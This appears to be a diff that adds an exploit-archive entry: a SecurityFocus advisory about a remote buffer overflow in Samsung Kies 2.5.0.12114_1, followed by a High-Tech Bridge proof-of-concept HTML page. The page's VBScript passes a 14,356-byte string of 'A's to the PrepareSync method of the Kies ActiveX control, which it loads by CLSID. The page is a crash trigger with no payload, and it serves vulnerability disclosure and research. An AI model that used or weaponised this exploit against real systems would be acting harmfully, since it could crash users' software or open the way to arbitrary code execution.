@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/57249/info
+
+Samsung Kies is prone to a remote buffer-overflow vulnerability because it fails to properly validate user-supplied input before copying it into a fixed-length buffer.
+
+Attackers can exploit this issue to execute arbitrary code in the context of the application. Failed attacks may cause a denial-of-service condition. 
+
+<html>
+<!-- (c)oded by High-Tech Bridge Security Research Lab -->
+<head>
+<title>Remote Buffer Overflow Vulnerability in Samsung Kies v. 
+2.5.0.12114_1 </title>
+</head>
+<script language='vbscript'>
+Sub PoC()
+arg1="defaultV"
+arg2=String(14356, "A")
+arg3=1
+arg4=1
+Target.PrepareSync arg1 ,arg2 ,arg3 ,arg4
+End Sub
+</script>
+<body>
+<h3>Remote Buffer Overflow Vulnerability in Samsung Kies by High-Tech 
+Bridge Security Research Lab</h3>
+<input language=VBScript onclick=PoC() type=button value="Proof of 
+Concept">
+</body>
+<object 
+classid='clsid:EA8A3985-F9DF-4652-A255-E4E7772AFCA8'id='Target'></object>
+</html>
